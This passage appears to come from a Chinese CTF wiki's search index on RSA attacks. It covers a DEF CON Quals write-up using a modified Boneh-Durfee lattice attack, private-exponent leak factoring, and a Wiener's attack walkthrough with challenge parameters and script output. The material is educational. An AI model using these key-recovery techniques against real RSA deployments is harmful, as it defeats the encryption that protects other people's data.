\\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00 d \\x02\\x00\\x15 } \\x00\\x00 n \\x00\\x00 t \\x01\\x00 } \\x01\\x00 | \\x01\\x00 d \\x03\\x00\\x15 } \\x02\\x00 d \\x02\\x00 } \\x03\\x00 xo \\x00 | \\x03\\x00 j \\x02\\x00\\x83\\x00\\x00 | \\x01\\x00 k \\x03\\x00 r \\xa4\\x00 xL \\x00 t \\x03\\x00 r \\x96\\x00 t \\x04\\x00 j \\x05\\x00 | \\x02\\x00\\x83\\x01\\x00 } \\x04\\x00 t \\x04\\x00 j \\x05\\x00 | \\x02\\x00\\x83\\x01\\x00 } \\x05\\x00 t \\x06\\x00 | \\x04\\x00 | \\x05\\x00\\x18\\x83\\x01\\x00 j \\x02\\x00\\x83\\x00\\x00 | \\x01\\x00 d \\x04\\x00\\x14 k \\x04\\x00 rK \\x00 PqK \\x00 qK \\x00 W| \\x04\\x00 | \\x05\\x00\\x14 } \\x03\\x00 q6 \\x00 W| \\x04\\x00 d \\x05\\x00\\x18 | \\x05\\x00 d \\x05\\x00\\x18\\x14 } \\x06\\x00 d \\x06\\x00 } \\x07\\x00 d \\x07\\x00 } \\x08\\x00 x \\t\\x01 t \\x03\\x00 r \\xce\\x01 t \\x04\\x00 j \\x07\\x00 t \\x08\\x00 d \\x03\\x00 t \\t\\x00 | \\x01\\x00 | \\x07\\x00\\x14\\x83\\x01\\x00\\x83\\x02\\x00 t \\x08\\x00 d \\x03\\x00 t \\t\\x00 | \\x01\\x00 | \\x07\\x00\\x14\\x83\\x01\\x00 d \\x05\\x00\\x17\\x83\\x02\\x00\\x83\\x02\\x00 } \\t\\x00 xq \\x00 | \\t\\x00 j \\x02\\x00\\x83\\x00\\x00 | \\x01\\x00 | \\x08\\x00\\x14 k \\x00\\x00 r{ \\x01 d \\x02\\x00 } \\n\\x00 xD \\x00 t \\x04\\x00 j \\n\\x00 | \\n\\x00\\x83\\x01\\x00 sm \\x01 t \\x04\\x00 j \\x07\\x00 t \\x08\\x00 d \\x03\\x00 d \\x08\\x00\\x83\\x02\\x00 t \\x08\\x00 d \\x03\\x00 d \\x08\\x00\\x83\\x02\\x00 t \\x08\\x00 d \\x03\\x00 d \\t\\x00\\x83\\x02\\x00\\x17\\x83\\x02\\x00 } \\n\\x00 q* \\x01 W| \\t\\x00 | \\n\\x00 9} \\t\\x00 q \\x0b\\x01 Wt \\x04\\x00 j \\x0b\\x00 | \\t\\x00 | \\x06\\x00\\x83\\x02\\x00 d \\x05\\x00 k \\x03\\x00 r \\x9a\\x01 q \\xc6\\x00 n \\x00\\x00 t \\x04\\x00 j \\x0c\\x00 | \\t\\x00 | \\x06\\x00\\x83\\x02\\x00 } \\x0b\\x00 t \\x04\\x00 j \\x0b\\x00 | \\x0b\\x00 | \\x06\\x00\\x83\\x02\\x00 d \\x05\\x00 k \\x03\\x00 r \\xca\\x01 q \\xc6\\x00 n \\x00\\x00 Pq \\xc6\\x00 Wd \\n\\x00 } \\x0c\\x00 | \\x03\\x00 | \\x0b\\x00 f \\x02\\x00 S' >>> t [ 6 : 26 ] 'd \\x01\\x00 d \\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00 d \\x02\\x00\\x15 } \\x00\\x00 ' >>> t [ - 3 :] ' \\x02\\x00 S' >>> t = 'd \\x01\\x00 d \\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00 d \\x02\\x00\\x15 } \\x00\\x00 ' >>> t [ - 3 :] '} \\x00\\x00 ' >>> t [: 7 ] + t [ - 3 :] 'd \\x01\\x00 d \\x02\\x00\\x15 } \\x00\\x00 ' >>> _ . encode ( 'hex' ) '640100640200157d0000' \u4ece\u800c\u6211\u4eec\u53ef\u4ee5\u4fee\u590d\u539f code >>> data . find ( '640100' ) 56 >>> data1 = data [: 56 ] + '640100640200157d0000640100640200157d0000' + data [ 56 + 40 :] >>> code1 = marshal . loads ( data1 . decode ( 'hex' )) >>> code_deparse ( code1 ) if False : x = 7 / 0 x = 7 / 0 Nsize = NSIZE pqsize = Nsize / 2 N = 0 while N . bit_length () != Nsize : while True : p = number . getStrongPrime ( pqsize ) q = number . getStrongPrime ( pqsize ) if abs ( p - q ) . bit_length () > Nsize * 0.496 : break N = p * q phi = ( p - 1 ) * ( q - 1 ) limit1 = 0.261 limit2 = 0.293 while True : d = number . getRandomRange ( pow ( 2 , int ( Nsize * limit1 )), pow ( 2 , int ( Nsize * limit1 ) + 1 )) while d . bit_length () < Nsize * limit2 : ppp = 0 while not number . isPrime ( ppp ): ppp = number . getRandomRange ( pow ( 2 , 45 ), pow ( 2 , 45 ) + pow ( 2 , 12 )) d *= ppp if number . GCD ( d , phi ) != 1 : continue e = number . inverse ( d , phi ) if number . GCD ( e , phi ) != 1 : continue break zzz = 3 return ( N , e ) < uncompyle6 . semantics . pysource . SourceWalker object at 0x10a0ea110 > \u53ef\u4ee5\u770b\u5230\u751f\u6210\u7684 d \u662f\u6545\u610f\u8d85\u4e86 0.292 \u7684\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 ppp \u8303\u56f4\u5f88\u5c0f\uff0c\u5b9e\u9645\u4e0a\u6211\u4eec\u53ef\u4ee5\u6d4b\u8bd5\u5f97\u5230\u8fd9\u4e2a\u8303\u56f4\u7684\u7d20\u6570\u4e3a 125 \u4e2a\u3002\u5e76\u4e14 1280 * 0.261 + 45 = 379.08000000000004 > 375.03999999999996 = 1280 * 0.293 \u6240\u4ee5\u5176\u5b9e\u8fd9\u91cc\u5c31\u4e58\u4e86\u4e00\u4e2a\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u5c31\u53ef\u4ee5\u679a\u4e3e\u4e00\u4e0b\u4e58\u4e86\u4ec0\u4e48\uff0c\u5e76\u4fee\u6539 e1=e*ppp\uff0c\u5176\u5b9e\u5c31\u56de\u5f52\u5230\u6807\u51c6\u7684 Boneh and Durfee attack\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 https://github.com/mimoo/RSA-and-LLL-attacks \u7684\u811a\u672c\u4e5f\u4e0d\u884c\uff0c\u5fc5\u987b\u5f97\u63d0\u9ad8 m\uff0c\u57fa\u672c\u5f97\u63d0\u5230 8\uff0c\u8fd9\u6837\u4ecd\u7136\u4e0d\u662f\u5f88\u7a33\u5b9a\u3002 \u5982\u679c\u4ed4\u7ec6\u5c1d\u8bd5\u5c1d\u8bd5\u7684\u8bdd\uff0c\u5c31\u4f1a\u53d1\u73b0 e1>N\uff0c\u8fd9\u770b\u8d77\u6765\u95ee\u9898\u4e0d\u5927\uff0c\u4f46\u662f\u539f\u811a\u672c\u91cc\u5047\u8bbe\u7684\u6570\u503c\u662f e<N \u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u9002\u5f53\u7684\u4fee\u6539\u9884\u4f30\u7684\u4e0a\u4e0b\u754c X = 2 * floor ( N ^ delta ) # this _might_ be too much Y = floor ( N ^ ( 1 / 2 )) # correct if p, q are ~ same size \u6839\u636e\u4e0a\u8ff0\u63a8\u5bfc\uff0c\u4e0a\u4e0b\u754c\u5e94\u8be5\u4e3a |k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta} |k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta} |y|<2*N^{0.5} |y|<2*N^{0.5} \u6700\u540e\u4e3b\u8981\u4fee\u6539\u4e86 m \u548c X \u7684\u4e0a\u754c delta = .262 # this means that d < N^delta # # Lattice (tweak those values) # # you should tweak this (after a first run), (e.g. increment it until a solution is found) m = 8 # size of the lattice (bigger the better/slower) # you need to be a lattice master to tweak these t = int (( 1 - 2 * delta ) * m ) # optimization from Herrmann and May X = floor ( 3 * e / N * N ^ delta ) #4*floor(N^delta) # this _might_ be too much Y = floor ( 2 * N ^ ( 1 / 2 )) # correct if p, q are ~ same size \u6700\u540e\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c [ DEBUG ] Received 0x1f bytes: 'Succcess!\\n' 'OOO{Br3akingL!mits?}\\n' OOO { Br3akingL!mits? } \u4e0d\u5f97\u4e0d\u8bf4\u8fd9\u4e2a\u9898\u76ee\uff0c\u771f\u7684\u662f\u9700\u8981 \u591a \u6838\u670d\u52a1\u5668\u3002\u3002","title":"2019 Defcon Quals ASRybaB"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_17","text":"Survey: Lattice Reduction Attacks on RSA An Introduction to Coppersmith\u2019s method and Applications in Cryptology","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/","text":"\u79c1\u94a5 d \u76f8\u5173\u653b\u51fb \u00b6 d \u6cc4\u9732\u653b\u51fb \u00b6 \u653b\u51fb\u539f\u7406 \u00b6 \u9996\u5148\u5f53 d d \u6cc4\u9732\u4e4b\u540e\uff0c\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u89e3\u5bc6\u6240\u6709\u52a0\u5bc6\u7684\u6d88\u606f\u3002\u6211\u4eec\u751a\u81f3\u8fd8\u53ef\u4ee5\u5bf9\u6a21\u6570 N \u8fdb\u884c\u5206\u89e3\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b \u6211\u4eec\u77e5\u9053 ed \\equiv 1 \\bmod \\varphi(n) ed \\equiv 1 \\bmod \\varphi(n) \uff0c\u90a3\u4e48\u5b58\u5728\u4e00\u4e2a k k \u4f7f\u5f97 ed-1=k\\varphi(n) ed-1=k\\varphi(n) \u53c8 \\forall a\\in {Z}_n^* \\forall a\\in {Z}_n^* \uff0c\u6ee1\u8db3 a^{ed-1}\\equiv1(\\bmod n) a^{ed-1}\\equiv1(\\bmod n) \u3002\u4ee4 ed-1=2^st ed-1=2^st \u5176\u4e2d\uff0c t t \u662f\u4e00\u4e2a\u5947\u6570\u3002\u7136\u540e\u53ef\u4ee5\u8bc1\u660e\u5bf9\u4e8e\u81f3\u5c11\u4e00\u534a\u7684 a\\in {Z}_n^* a\\in {Z}_n^* \uff0c\u5b58\u5728\u4e00\u4e2a i\\in[1,s] i\\in[1,s] \uff0c\u4f7f\u5f97 a^{2^{i-1}t}\\not\\equiv\\pm1(\\bmod n),a^{2^{i}t}\\equiv1(\\bmod n) a^{2^{i-1}t}\\not\\equiv\\pm1(\\bmod n),a^{2^{i}t}\\equiv1(\\bmod n) \u6210\u7acb\u3002\u5982\u679c a,i a,i \u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\uff0c gcd(a^{2^{i-1}t}-1,n) gcd(a^{2^{i-1}t}-1,n) \u662f n n \u7684\u4e00\u4e2a\u975e\u5e73\u51e1\u56e0\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u5bf9 n n \u8fdb\u884c\u66b4\u529b\u5206\u89e3\u3002 \u5de5\u5177 \u00b6 \u5229\u7528\u4ee5\u4e0b\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u8ba1\u7b97 RsaConverter.exe ( https://sourceforge.net/projects/rsaconverter/ , for windows ) rsatool.py (\u5206\u89e3\u539f\u7406\u5982\u4e0a) 2017 HITB - hack in the card II \u00b6 The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -> publickey.pem). However it seems that they missed something...... Can you decrypt the following hex-encoded ciphertext this time? 016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977 \u8fd9\u9898\u662f\u63a5\u7eed 2017 HITB - hack in the card I \u7684\u4e00\u9053\u9898\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 openssl \u67e5\u770b publickey.pem \u7684\u516c\u94a5\uff0c\u53d1\u73b0\u5b83\u7684 N \u4e0e\u4e0a\u4e00\u9053\u9898\u7684 N \u76f8\u540c\uff0c\u5e76\u4e14\u4e0a\u9898\u7684 N\uff0ce\uff0cd \u5df2\u77e5\u3002\u7531\u6b64\u53ef\u76f4\u63a5\u4f7f\u7528\u4e0a\u9762\u7684 rsatool.py \u5f97\u5230 p\uff0cq\uff0c\u5e76\u901a\u8fc7\u672c\u9898\u7684 e \u8ba1\u7b97\u51fa e \u5f97\u5230\u660e\u6587\u3002 Wiener's Attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5728 d \u6bd4\u8f83\u5c0f\uff08 d<\\frac{1}{3}N^{\\frac{1}{4}} d<\\frac{1}{3}N^{\\frac{1}{4}} \uff09\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528 Wiener's Attack \u6765\u83b7\u5f97\u79c1\u94a5\u3002 \u653b\u51fb\u539f\u7406 \u00b6 https://en.wikipedia.org/wiki/Wiener%27s_attack https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/ \u5de5\u5177 \u00b6 https://github.com/pablocelayes/rsa-wiener-attack https://github.com/orisano/owiener \u7efc\u5408\u4f8b\u5b50 \u00b6 2016 HCTF RSA1 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d RSA 1 - Crypto So Interesting \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\uff0c \u6e90\u4ee3\u7801\u94fe\u63a5 \u3002 \u9996\u5148\u5148\u7ed5\u8fc7\u7a0b\u5e8f\u7684 proof \u90e8\u5206\uff0c\u5dee\u4e0d\u591a\u4f7f\u7528\u4e00\u4e9b\u968f\u673a\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u4ee3\u7801\u90e8\u5206\uff0c\u7a0b\u5e8f\u662f\u6839\u636e\u6211\u4eec\u7684 token \u6765\u83b7\u53d6 flag \u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u5229\u7528\u6e90\u4ee3\u7801\u4e2d\u63d0\u4f9b\u7684 token\u3002 print \"This is a RSA Decryption System\" print \"Please enter Your team token: \" token = raw_input () try : flag = get_flag ( token ) assert len ( flag ) == 38 except : print \"Token error!\" m_exit ( - 1 ) \u63a5\u4e0b\u6765\u6211\u4eec\u9996\u5148\u77e5\u9053 n=pq n=pq \uff0c\u6211\u4eec\u518d\u6765\u4f60\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2a e\uff0cd \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002 p = getPrime ( 2048 ) q = getPrime ( 2048 ) n = p * q e , d = get_ed ( p , q ) print \"n: \" , hex ( n ) print \"e: \" , hex ( e ) get_ed \u51fd\u6570\u5982\u4e0b def get_ed ( p , q ): k = cal_bit ( q * p ) phi_n = ( p - 1 ) * ( q - 1 ) r = random . randint ( 10 , 99 ) while True : u = getPrime ( k / 4 - r ) if gcd ( u , phi_n ) != 1 : continue t = invmod ( u , phi_n ) e = pi_b ( t ) if gcd ( e , phi_n ) == 1 : break d = invmod ( e , phi_n ) return ( e , d ) \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u5f97\u5230\u7684 u \u7684\u4f4d\u6570\u6bd4 n \u7684\u4f4d\u6570\u7684\u56db\u5206\u4e4b\u4e00\u8fd8\u8981\u5c11\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u5dee\u4e0d\u591a\u6ee1\u8db3\u4e86 Wiener's Attack \u4e86\u3002\u800c\u4e14\u6211\u4eec\u8ba1\u7b97\u51fa\u6765\u7684 u\uff0ct\uff0ce\uff0cd \u8fd8\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \\begin{align*} ut &\\equiv 1 \\bmod \\varphi(n) \\\\ et &\\equiv 1 \\bmod bt \\\\ ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} \\begin{align*} ut &\\equiv 1 \\bmod \\varphi(n) \\\\ et &\\equiv 1 \\bmod bt \\\\ ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} \u6839\u636e\u9898\u4e2d\u7ed9\u51fa\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 n\uff0ce\uff0cbt\u3002 \u6240\u4ee5\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u7b2c\u4e8c\u4e2a\u5f0f\u5b50\u77e5\u9053 e\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u4e2a\u5f0f\u5b50\u8fdb\u884c Wiener's Attack\uff0c\u83b7\u53d6 u\u3002\u8fdb\u800c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u79c1\u94a5\u6307\u6570\u6cc4\u9732\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u5206\u89e3 N \u4ece\u800c\u5f97\u5230 p\uff0cq\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230 d \u4e86\u3002 \u9996\u5148\u6211\u4eec\u7ed5\u8fc7 proof \u5f97\u5230\u4e86 N\uff0ce\uff0c\u52a0\u5bc6\u540e\u7684 flag \u5982\u4e0b n: 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 e: 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1 flag: 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df \u5176\u6b21\u4f7f\u7528\u5982\u4e0b\u65b9\u6cd5\u8fdb\u884c Wiener's Attack \u5f97\u5230 u\uff0c\u5982\u4e0b if __name__ == \"__main__\" : bt = 536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273 L e = 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1 t = gmpy2 . invert ( e , bt ) n = 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 solve ( n , t ) \u5176\u4e2d solve \u51fd\u6570\u5c31\u662f\u5bf9\u5e94\u7684 Wiener's Attack \u7684\u51fd\u6570\u3002 \u6211\u4eec\u5f97\u5230\u4e86 u\uff0c\u5982\u4e0b \u279c rsa-wiener-attack git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) \u63a5\u7740\u5229\u7528 RsaConverter \u4ee5\u53ca u\uff0ct\uff0cn \u83b7\u53d6\u5bf9\u5e94\u7684 p \u548c q\u3002\u5982\u4e0b 94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 \u7136\u540e\u6211\u4eec\u76f4\u63a5\u53bb\u83b7\u5f97 d\uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u6062\u590d\u660e\u6587 p = 0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 q = 